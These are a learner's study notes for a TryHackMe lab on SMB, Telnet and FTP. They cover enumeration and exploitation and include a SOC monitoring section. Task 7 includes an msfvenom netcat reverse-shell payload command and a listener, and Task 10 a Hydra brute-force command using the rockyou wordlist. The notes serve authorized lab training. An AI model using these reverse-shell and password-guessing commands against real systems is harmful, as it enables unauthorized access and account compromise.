# Network Services — Detailed Study Notes

**Platform:** TryHackMe  
**Study date:** 19 November 2026  
**Scope:** Tasks 2–10 — SMB, Telnet, FTP, enumeration, and exploitation concepts  
**Learning focus:** Network-service enumeration, misconfiguration discovery, authorized lab testing, and SOC awareness

> Based on the lesson text supplied. The pasted material contains questions marked “Correct Answer” but does not include the actual scan outputs, lab target details for every task, discovered filenames, credentials, or the contents of `flag.txt`. These results are deliberately not guessed or fabricated.

---

## Learning Overview

Network services allow systems to share resources and provide remote functionality. They can also expose sensitive information or allow unauthorized access when configured insecurely.

| Service | Main purpose | Security concern emphasized in the lesson |
|---|---|---|
| SMB | Network file, printer, and resource sharing | Anonymous or overly broad share access; sensitive files exposed |
| Telnet | Remote terminal access | Communication is plaintext and lacks modern transport protection |
| FTP | File transfer | Commands, credentials, and data may be sent unencrypted; anonymous or weak authentication |

A repeatable workflow applies to each service:

1. **Discover** reachable hosts and open ports.
2. **Identify** services and versions where possible.
3. **Enumerate** accessible users, shares, directories, or service information.
4. **Validate** whether configuration exposes an unintended capability.
5. **Demonstrate impact** only within the authorized lab scope.
6. **Document** evidence, impact, and remediation.
7. **Think defensively** about which logs and network events would help a SOC investigate.

---

# Task 2 — Understanding SMB

## 1. What is SMB?

**SMB (Server Message Block)** is a client-server protocol used to share access to network resources, including:

- Files and directories.
- Printers.
- Serial ports.
- Named pipes and other shared resources.

A server makes resources available to network clients. A client can access a remote share in a way that resembles using a local filesystem, even though the data and operations travel over the network.

SMB is a **request-response protocol**. A client sends SMB requests to a server, and the server returns responses. Multiple exchanges establish and operate a session.

The lesson references older transports and networking stacks including TCP/IP, NetBIOS over TCP/IP, NetBEUI, and IPX/SPX. In modern environments, SMB commonly operates directly over TCP port 445; older NetBIOS-based SMB can use ports 137–139.

## 2. How SMB works at a high level

```text
SMB Client                         SMB Server
    |                                  |
    |------ Connect / negotiate ------>|
    |<----- Server response -----------|
    |------ Session setup ------------>|
    |<----- Session response ----------|
    |------ Tree connect to share ---->|
    |<----- Share access response -----|
    |------ File or directory request>|
    |<----- File data / response ------|
```

Once connected, a client can:
- List or browse shares.
- Open files.
- Read and write files, if permitted.
- Transfer data.
- Access other resources exposed by the server.

## 3. What runs SMB?

The lesson highlights:
- Microsoft Windows has included SMB client and server support since Windows 95.
- **Samba** is an open-source implementation that provides SMB interoperability on Unix-like systems.

SMB is therefore not limited to Windows-only networks. A Linux server running Samba can expose SMB shares too.

## 4. Security perspective

A share may contain documents, backups, scripts, configuration files, or other information. If anonymous users or overly broad groups can read it, information may be exposed.

Questions to ask:
- Which shares are exposed?
- Who can list or access each share?
- Is anonymous or guest access enabled?
- Are sensitive files stored in a broadly accessible location?
- Are write permissions broader than required?

---

# Task 3 — Enumerating SMB

## 1. What is enumeration?

**Enumeration** is the process of gathering information about a target to identify possible attack paths and understand its exposed services.

The lesson lists examples of useful information:
- Usernames and groups.
- Password-policy information.
- Network details and hostnames.
- Applications and services.
- Shared resources.
- Other information valuable to an attacker.

Enumeration should guide testing. It reduces guesswork and helps avoid running unsuitable exploits that may fail or destabilize a system.

## 2. Start with port scanning

The lesson recommends beginning with a port scan to learn which services are reachable and what the target may be running.

Nmap is the suggested tool. The lesson also points to the [Further Nmap room](https://tryhackme.com/room/furthernmap).

When documenting a scan, record:
- Target address.
- Scan type and options.
- Open ports.
- Service names and version guesses.
- Date/time and lab target identity.

Do not infer a service solely from a port number: non-standard ports exist, and services can be configured to listen elsewhere.

## 3. Enum4linux

**Enum4linux** is a tool for enumerating SMB information on Windows and Linux systems. The lesson describes it as a wrapper around tools from the Samba package, simplifying collection of SMB-related information.

Official repository from the lesson:
[enum4linux on GitHub](https://github.com/portcullislabs/enum4linux)

General syntax:

```bash
enum4linux [options] <IP>
```

### Options in the lesson

| Option | Function |
|---|---|
| `-U` | Get the user list |
| `-M` | Get the machine list |
| `-N` | Get the NetBIOS name-list dump |
| `-S` | Get the share list |
| `-P` | Get password-policy information |
| `-G` | Get groups and group members |
| `-a` | Perform the full basic enumeration set |

### What should I look for?

When reviewing output, note:
- User and group names.
- Machine and NetBIOS names.
- Share names and access information.
- Password-policy settings.
- Whether guest or anonymous access appears possible.

Enumeration results are clues, not proof of access. Confirm access permissions with the service in the authorized lab.

## 4. SMB enumeration workflow

```text
Identify target
     |
     v
Scan ports and detect services
     |
     v
Identify SMB availability
     |
     v
Enumerate users, groups, shares, and policy
     |
     v
Record interesting shares
     |
     v
Test permitted access in the lab
     |
     v
Document evidence and impact
```

---

# Task 4 — Exploiting SMB

## 1. Types of SMB exploitation

The lesson mentions vulnerabilities such as **CVE-2017-7494**, which affected certain Samba configurations and could enable remote code execution under vulnerable conditions.

However, this exercise focuses on a more common practical issue: **misconfiguration**, particularly anonymous SMB share access.

Distinction:
- A **software vulnerability** is a weakness in an implementation.
- A **misconfiguration** is an unsafe setting or permission choice.
- Both can create security exposure, but they are different root causes.

## 2. Method breakdown

The lesson assumes enumeration has identified:
- The SMB share location.
- The name of an interesting share.

The next step is to use an SMB client to interact with that share.

## 3. SMBClient

`smbclient` is a command-line SMB client included in the Samba suite. It can connect to SMB shares on remote servers.

The lesson gives this syntax:

```bash
smbclient //<IP>/<SHARE> -U <USERNAME> -p <PORT>
```

Example from the lesson:

```bash
smbclient //10.10.10.10/secrets -U Anonymous -p 445
```

The IP and share in this example are illustrative.

### Useful commands inside smbclient

| Command | Purpose |
|---|---|
| `help` | Display available commands |
| `ls` or `dir` | List files and directories |
| `cd <DIR>` | Change the current remote directory |
| `get <FILE>` | Download a file to the local AttackBox |

### Why anonymous access matters

Anonymous access may be intentional for a public share, but it becomes a security issue if the share exposes data that should be restricted.

During a lab, document:
- Whether access was possible without an individual account.
- Which share was accessible.
- Which files or folders were visible.
- Whether read or write operations were permitted.
- Why the discovered information matters.

Being able to list a share does not mean you can modify its contents. Read and write permissions are separate.

---

# Task 5 — Understanding Telnet

## 1. What is Telnet?

**Telnet** is an application-layer protocol that provides terminal-style access to a remote machine when a Telnet server is running.

A Telnet client connects to the server. The client acts like a virtual terminal, allowing a user to interact with the remote host and execute commands if authentication and permissions allow it.

The lesson gives this connection syntax:

```bash
telnet <IP> <PORT>
```

## 2. Why Telnet is insecure

The key problem emphasized in the lesson is that Telnet sends communication in **cleartext** and does not provide the encryption expected of modern remote administration.

This may expose:
- Usernames.
- Passwords.
- Commands entered by the user.
- Output returned by the server.
- Other session data.

For this reason, SSH has replaced Telnet for most secure remote-administration use cases.

## 3. Telnet versus SSH

| Feature | Telnet | SSH |
|---|---|---|
| Remote terminal access | Yes | Yes |
| Session encryption | No built-in encryption | Encrypted |
| Credentials protected in transit | No | Protected within the SSH session |
| Modern secure administration | Not recommended | Standard choice |

**Key takeaway:** Telnet may still appear in legacy systems and labs, but it should not be exposed for sensitive remote administration.

---

# Task 6 — Enumerating Telnet

## 1. Thorough enumeration

The lesson reinforces that enumeration should be methodical. A service may be exposed on a non-standard port, so checking only common ports can miss it.

The lesson asks the learner to:
- Scan the target with Nmap.
- Include non-standard ports.
- Compare the full-port scan with the default Nmap scan.
- Identify the unusual service and its reported protocol.
- Interpret the service title.
- Record a possible username.

The actual scan output and answers were not included in the supplied text, so these lab-specific values are left for my own notes rather than guessed.

## 2. Why a full-port scan matters

A default Nmap scan checks the most common ports. A service configured on an uncommon or high-numbered port may not appear in that scan.

The lesson highlights that a full-port scan can reveal a Telnet service that is not included in the default top-1000 port list.

When documenting the scan, compare:
- Ports found by the default scan.
- Ports found by the full TCP port range.
- Service detection results.
- Unusual service names or banners.

## 3. Enumeration notes to record

| Item | My lab result |
|---|---|
| Target IP | __________________ |
| Number of open ports in full scan | __________________ |
| Non-standard Telnet port | __________________ |
| Reported protocol | __________________ |
| Number of open ports in default scan | __________________ |
| Service title/banner | __________________ |
| Possible username | __________________ |

Do not treat a service name or banner as definitive proof. Validate service behavior in the authorized lab.

---

# Task 7 — Exploiting Telnet

## 1. Why Telnet may be exploitable

The lesson identifies two broad possibilities:
- A software vulnerability affecting a Telnet client or server.
- A misconfiguration or poorly protected service.

The lesson references:
- [CVE Details](https://www.cvedetails.com/)
- [MITRE CVE](https://cve.mitre.org/)

**CVE** stands for Common Vulnerabilities and Exposures. A CVE ID identifies a publicly disclosed security vulnerability.

The room's scenario states that enumeration found:
- A Telnet service on a non-standard port.
- A service label suggesting a backdoor.
- A possible username, `Skidy`.

These are scenario clues supplied by the lesson, not results independently verified from terminal output.

## 2. Connecting to Telnet

The lesson's connection syntax is:

```bash
telnet <IP> <PORT>
```

In the lab, the purpose is to determine whether the service accepts a connection and what behavior or welcome message it presents.

## 3. What is a shell?

A **shell** is a program or interface that allows a user to issue commands to an operating system.

A shell can provide command execution on a system, subject to the permissions of the account or process running it.

## 4. What is a reverse shell?

A **reverse shell** is a connection initiated from the target machine back to the operator's listening machine.

```text
Operator / Attacker Machine             Lab Target
          |                                  |
          |---- Start listener ------------>|
          |                                  |
          |<--- Target initiates connection-|
          |                                  |
          |<==== Interactive shell I/O ====>|
```

The operator starts a listener. If the target executes an authorized reverse-shell payload and can reach the operator, the target connects back and provides a command interface.

A reverse shell does not automatically mean administrative/root access. The privileges are determined by the user context in which the command or shell runs.

## 5. Testing whether input is executed

The lesson uses an ICMP ping test to determine whether text sent through the Telnet session is being executed as a system command.

It asks the learner to:
- Start a `tcpdump` capture for ICMP traffic on the correct local interface.
- Send a ping command through the Telnet session, prefixed with `.RUN`.
- Check whether the local machine receives the ping.

The capture command differs by environment.

**Own machine connected through the TryHackMe VPN:**

```bash
sudo tcpdump ip proto \icmp -i tun0
```

**TryHackMe AttackBox:**

```bash
sudo tcpdump ip proto \icmp -i ens5
```

The interface name matters:
- `tun0` is commonly associated with a VPN tunnel interface.
- `ens5` is the interface specified by the lesson for the AttackBox environment.

The supplied text does not include actual ping output. Record whether packets arrived only after performing the lab step.

## 6. Reverse-shell payload generation — concept

The lesson introduces `msfvenom` as a way to generate a reverse-shell payload and gives this command structure:

```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<LOCAL_IP> lport=4444 R
```

| Parameter | Meaning |
|---|---|
| `-p` | Selects the payload |
| `cmd/unix/reverse_netcat` | Selects the lesson's Unix/netcat reverse-shell payload |
| `lhost` | The operator's reachable local IP address |
| `lport` | The port on the operator machine where the shell should connect |
| `R` | Outputs the payload in raw format |

The generated payload is intended to be executed in the authorized lab Telnet session. Its exact first word depends on the actual output, which was not provided.

## 7. Listener concept

The lesson gives this netcat listener syntax:

```bash
nc -lvnp <LISTENING_PORT>
```

The flags commonly mean:
- `-l`: listen for an incoming connection.
- `-v`: verbose output.
- `-n`: do not resolve names.
- `-p`: specify the local listening port.

For the lesson's example port `4444`, the corresponding listener command is:

```bash
nc -lvnp 4444
```

Only run reverse-shell testing against the explicitly authorized TryHackMe target or a lab system you control. A listener can expose a command shell if a connection arrives, so do not leave it running unnecessarily.

## 8. Lab result fields

| Question / observation | My result |
|---|---|
| Telnet connection successful? | __________________ |
| Welcome message | __________________ |
| Does ordinary input return output? | __________________ |
| Did the `.RUN` ping test execute? | __________________ |
| Did `tcpdump` capture ICMP packets? | __________________ |
| First word of generated payload | __________________ |
| Listener command | `nc -lvnp 4444` |
| Reverse-shell connection received? | __________________ |
| Contents of `flag.txt` | __________________ |

No flag or missing answer has been invented.

---

# Task 8 — Understanding FTP

## 1. What is FTP?

**FTP (File Transfer Protocol)** is an application-layer protocol used to transfer files between a client and a server.

It uses a client-server model:
1. The client initiates a connection.
2. The server validates the supplied login credentials.
3. A session is established.
4. The client sends commands to perform file-transfer operations.

## 2. FTP uses two channels

A typical FTP session uses separate channels.

### Command / control channel
Used for:
- Client commands.
- Server replies.
- Session control.

### Data channel
Used for:
- File downloads.
- File uploads.
- Directory listings and other data transfers.

Separating control and data allows commands and responses to be managed independently of the data transfer.

## 3. Active versus passive FTP

| Mode | Who opens the data connection? | Basic behavior |
|---|---|---|
| Active FTP | The client opens a listening port; the server initiates the data connection back to the client | Server connects back to the client |
| Passive FTP | The server opens a listening data port; the client connects to it | Client initiates both control and data connections |

Passive mode is often easier to use through client-side firewalls and NAT because the client initiates the data connection.

## 4. FTP security concern

Traditional FTP does not encrypt its command or data channels. Depending on configuration, usernames, passwords, commands, and transferred files can be exposed to someone able to capture the traffic.

Secure alternatives include:
- **SFTP:** file transfer over SSH.
- **FTPS:** FTP protected using TLS.

SFTP and FTPS are different protocols; the names are not interchangeable.

Standard reference supplied by the lesson:
[IETF RFC 959 — File Transfer Protocol](https://www.ietf.org/rfc/rfc959.txt)

---

# Task 9 — Enumerating FTP

## 1. Enumeration objective

The lesson's scenario focuses on **anonymous FTP login** and checking whether the anonymous directory exposes files that could reveal useful information.

Workflow:
1. Scan the lab target with Nmap.
2. Identify open ports.
3. Determine which port is running FTP.
4. Identify the FTP server variant/banner.
5. Attempt anonymous login in the authorized lab.
6. List files in the anonymous directory.
7. Review discovered information for clues such as possible usernames.

## 2. FTP client

The lesson says most Linux systems such as Kali or Parrot usually include an FTP client.

Test whether the client is installed by entering:

```bash
ftp
```

If the system opens an `ftp>` prompt, the client is available. The lesson gives this installation command if required:

```bash
sudo apt install ftp
```

## 3. Anonymous FTP

Some FTP servers allow login using the username `anonymous`. The exact password behavior depends on server configuration; the lesson instructs entering `anonymous` and submitting no password for this lab.

Anonymous access is not automatically a vulnerability. It becomes a security issue when the exposed directory contains information that should not be public or when permissions allow unintended writes.

## 4. Alternative enumeration technique described

The lesson describes a legacy behavior in some vulnerable versions of `in.ftpd` and other FTP server variants: different responses to the `cwd` command may reveal whether a user's home directory exists, even before authentication.

If the server reveals that a home directory exists, that may suggest a corresponding user account.

The lesson references:
[Exploit-DB entry 20745](https://www.exploit-db.com/exploits/20745)

This is a legacy, implementation-specific behavior, not a universal FTP feature.

## 5. FTP enumeration result sheet

The actual outputs were not included in the pasted lesson. Fill these in from your own lab:

| Question / observation | My result |
|---|---|
| Target IP | __________________ |
| Number of open ports | __________________ |
| FTP port | __________________ |
| FTP server variant | __________________ |
| Anonymous login successful? | __________________ |
| File in anonymous directory | __________________ |
| Possible username discovered | __________________ |

---

# Task 10 — Exploiting FTP

## 1. FTP risks

The lesson highlights that traditional FTP sends both command and data traffic without encryption. A person able to intercept the traffic may be able to read:
- Usernames.
- Passwords.
- Commands.
- Transferred files.

The lesson references a man-in-the-middle example involving ARP poisoning. This demonstrates the danger of transmitting credentials and files without encryption.

## 2. Weak or default passwords

The scenario proceeds from FTP enumeration:
- An FTP service is running.
- A possible username has been discovered.

The lesson then introduces password guessing against the FTP login.

Anonymous access testing and password guessing are different checks. A server may deny anonymous access but still have a weak password on an ordinary account.

## 3. Hydra

**Hydra** (THC Hydra) is an online login-auditing tool that supports multiple protocols, including FTP, SSH, Telnet, HTTP(S), RDP, SMB, and databases.

Official repository:
[THC Hydra on GitHub](https://github.com/vanhauser-thc/thc-hydra)

The lesson provides this example command:

```bash
hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
```

This is the lesson's lab example. It should only be used against the authorized lab target or another system for which explicit testing permission exists.

### Command breakdown

| Part | Meaning |
|---|---|
| `hydra` | Runs the Hydra tool |
| `-t 4` | Uses four parallel tasks/threads for the target |
| `-l dale` | Specifies one username |
| `-P /usr/share/wordlists/rockyou.txt` | Specifies the password wordlist |
| `-vV` | Enables verbose output, including login/password attempts |
| `10.10.10.6` | Example target IP from the lesson command |
| `ftp` | Selects the FTP protocol module |

### Online versus offline password attacks

| Online guessing (Hydra example) | Offline guessing |
|---|---|
| Sends authentication attempts to the live service | Tests candidates against captured password-verification data locally |
| Can trigger account lockouts and alerts | Does not send each guess to the live login service |
| Depends on service availability and network response | Depends on having the relevant captured data |
| Must be rate-limited and explicitly authorized | Still requires lawful possession and authorization for the data |

Online password guessing can lock accounts, generate large volumes of authentication events, or degrade a service. Use only the provided lab target and respect the assigned scope.

---

# How the Three Services Compare

| Service | Main purpose | Important enumeration targets | Key defensive concern |
|---|---|---|---|
| SMB | File and resource sharing | Shares, users, groups, password policy, anonymous access | Sensitive data exposure and excessive permissions |
| Telnet | Remote terminal access | Open/non-standard ports, banner, service behavior, authentication | Cleartext credentials and commands; unauthorized command execution |
| FTP | File transfer | Server variant, anonymous login, directory contents, user clues | Cleartext traffic, anonymous access, weak credentials |

---

# SOC Analyst Perspective

These exercises are offensive in presentation, but the same behaviors can be understood from a defensive monitoring perspective.

## 1. SMB monitoring

Potentially useful evidence:
- SMB connections to unusual servers.
- Access to administrative or sensitive shares.
- Unexpected guest/anonymous share access.
- Unusual file reads or writes.
- Access to many shares in a short period.
- SMB traffic between systems that normally do not communicate.

Investigative questions:
- Which host initiated the SMB session?
- Which server/share was accessed?
- Which account was used?
- Were files read, modified, or copied?
- Was the access expected for that user and device?

## 2. Telnet monitoring

Potentially useful evidence:
- New or unexpected Telnet listeners.
- Connections to non-standard TCP ports.
- Cleartext remote login activity.
- Unexpected command execution following a Telnet session.
- Unusual outbound connections from a server after remote access.

Investigative questions:
- Why is Telnet enabled?
- Is the service approved?
- Which account connected?
- What process or command activity followed?
- Did the host initiate an unusual outbound connection?

## 3. FTP monitoring

Potentially useful evidence:
- Anonymous FTP logins.
- Repeated failed FTP logins.
- Successful logins after many failures.
- Large or unusual downloads/uploads.
- FTP access from unexpected source addresses.
- Access to sensitive directories.

Investigative questions:
- Was anonymous access expected?
- Which account accessed the server?
- What files were listed or transferred?
- Did authentication failures precede a successful login?
- Was sensitive information transferred?

## 4. Connect activity to evidence

Do not conclude that a host is compromised just because a port is open or a service is running. Correlate:
- Network-flow or firewall logs.
- Service and authentication logs.
- Endpoint process telemetry.
- File access records.
- User and asset context.
- Timestamps and relevant changes.

The aim is to reconstruct what happened and distinguish normal administration from suspicious behavior.

---

# Key Terms — Quick Revision

| Term | Meaning |
|---|---|
| SMB | Server Message Block protocol for network resource sharing |
| Samba | Open-source SMB implementation for Unix-like systems |
| Share | Network resource made available by a server |
| Enumeration | Systematic information gathering about a target |
| Enum4linux | SMB enumeration utility |
| smbclient | Command-line SMB client |
| Telnet | Remote terminal protocol that transmits data in cleartext |
| SSH | Encrypted protocol for secure remote access |
| Shell | Interface for executing operating-system commands |
| Reverse shell | A shell connection initiated from the target back to the operator |
| ICMP | Internet Control Message Protocol, used by tools such as ping |
| tcpdump | Command-line packet capture and inspection tool |
| FTP | File Transfer Protocol |
| Control channel | FTP channel for commands and replies |
| Data channel | FTP channel for file/listing data |
| Active FTP | Server initiates the data connection back to the client |
| Passive FTP | Client initiates the data connection to a server-selected port |
| Anonymous FTP | FTP access that does not use a normal individual account |
| Hydra | Online login-auditing tool supporting multiple protocols |
| CVE | Common Vulnerabilities and Exposures identifier |

---

# My Key Takeaways

- I learned that SMB allows network clients to access shared files and resources from servers.
- I understood why SMB share permissions matter and how anonymous access can expose sensitive information.
- I learned the purpose of enumeration and why a structured port scan should come before service-specific testing.
- I became familiar with Enum4linux and its options for retrieving users, machines, shares, password policies, groups, and members.
- I learned how `smbclient` is used to interact with a share and how to list or download files.
- I understood why Telnet is insecure: it sends communication in cleartext and has largely been replaced by SSH for secure remote administration.
- I learned why scanning all TCP ports can reveal services running on non-standard ports.
- I understood the difference between a shell and a reverse shell, and how a target-initiated connection can provide an interactive session.
- I learned how `tcpdump` can be used to observe ICMP traffic during a controlled lab test.
- I understood that FTP separates command/control traffic from data traffic and supports active and passive modes.
- I learned how anonymous FTP access can expose information and how server banners help identify the service.
- I became familiar with Hydra's command structure and the difference between online and offline password attacks.
- I connected the practical attack paths to SOC monitoring opportunities across SMB, Telnet, and FTP.

---

# Self-Test Questions

1. What does SMB stand for, and what resources can it share?
2. What is the difference between an SMB client and an SMB server?
3. What is Samba?
4. What is enumeration, and why is it performed before exploitation?
5. What information can Enum4linux gather?
6. What does the `-S` option do in Enum4linux?
7. What is the purpose of `smbclient`?
8. Why can anonymous SMB access be risky?
9. What is Telnet used for?
10. Why is Telnet considered insecure?
11. Why might a full-port scan find a service that a default Nmap scan misses?
12. What is a shell?
13. What is a reverse shell, and which side initiates the connection?
14. What does `tcpdump` help an analyst observe?
15. What is FTP used for?
16. What are the FTP control and data channels?
17. What is the difference between active and passive FTP?
18. Why is anonymous FTP worth checking during enumeration?
19. What is Hydra used for?
20. What is the difference between online and offline password guessing?
21. Name two SOC signals that may indicate suspicious SMB activity.
22. Name two SOC signals that may indicate suspicious FTP activity.

---

# Practice Checklist

- [ ] Explain SMB and the client-server model.
- [ ] Describe what Samba provides.
- [ ] Explain enumeration and why port scanning is a starting point.
- [ ] Recall the Enum4linux options in the lesson.
- [ ] Explain what `smbclient` does.
- [ ] Describe the risk of anonymous SMB shares.
- [ ] Explain why Telnet is insecure and why SSH is preferred.
- [ ] Explain why non-standard ports can be missed by a default scan.
- [ ] Describe a reverse shell at a conceptual level.
- [ ] Explain the purpose of `tcpdump` in the ICMP test.
- [ ] Compare FTP control and data channels.
- [ ] Compare active and passive FTP.
- [ ] Explain the risk of anonymous FTP and plaintext credentials.
- [ ] Explain Hydra's parameters in the supplied example.
- [ ] Identify defensive monitoring opportunities for SMB, Telnet, and FTP.
- [ ] Record actual lab outputs separately from lesson explanations.

---

# Lab Results to Complete

The supplied lesson text includes questions and indicates some answers were marked correct, but it does not include the actual values or terminal outputs. Fill these in from the TryHackMe room rather than guessing.

## SMB (Tasks 3–4)

| Item | My lab result |
|---|---|
| Target IP | __________________ |
| Open ports | __________________ |
| SMB service/version | __________________ |
| NetBIOS/workgroup name | __________________ |
| Usernames discovered | __________________ |
| Shares discovered | __________________ |
| Interesting share | __________________ |
| Anonymous access result | __________________ |
| Files discovered/downloaded | __________________ |

## Telnet (Tasks 6–7)

| Item | My lab result |
|---|---|
| Target IP | __________________ |
| Full-scan open-port count | __________________ |
| Non-standard Telnet port | __________________ |
| Reported protocol | __________________ |
| Default-scan open-port count | __________________ |
| Service title/banner | __________________ |
| Possible username | __________________ |
| Welcome message | __________________ |
| `.RUN` / ICMP test result | __________________ |
| Reverse-shell connection received | __________________ |
| `flag.txt` contents | __________________ |

## FTP (Tasks 9–10)

| Item | My lab result |
|---|---|
| Target IP | __________________ |
| Open-port count | __________________ |
| FTP port | __________________ |
| FTP server variant | __________________ |
| Anonymous login result | __________________ |
| File in anonymous directory | __________________ |
| Possible username | __________________ |
| Authorized password-audit result | __________________ |

---


